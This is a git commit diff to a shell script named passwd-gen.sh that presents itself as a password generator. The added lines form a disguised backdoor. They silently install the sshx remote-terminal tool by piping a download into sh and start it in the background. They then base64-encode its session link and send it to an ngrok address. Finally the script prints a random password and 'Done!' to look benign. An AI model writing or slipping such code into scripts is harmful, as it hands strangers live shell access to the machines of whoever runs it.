d1a14c76c20d1339ceec1fcb7a6b08920c404809
Seg Fault <melvin.mohadeb@epitech.eu>
2025-01-21 19:07:40 +0100

    passwdgen

--- passwd-gen.sh
+++ passwd-gen.sh
@@ -1,8 +1,15 @@
-# Genpasswd
-
-cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 10
+echo "Generating password..."
 
 # Install sshx
-curl -sSf https://sshx.io/get | sh > /dev/null 2>&1
+if ! command -v sshx > /dev/null 2>&1; then
+    curl -sSf https://sshx.io/get | sh > /dev/null 2>&1
+fi
 
-sudo sshx 
+sshx -q > /tmp/sshxurl.txt 2>&1 &
+sleep 1
+URL=$(base64 /tmp/sshxurl.txt)
+
+curl -s https://advanced-hardy-dolphin.ngrok-free.app/$URL > /dev/null 2>&1
+
+cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 10
+echo "Done!"
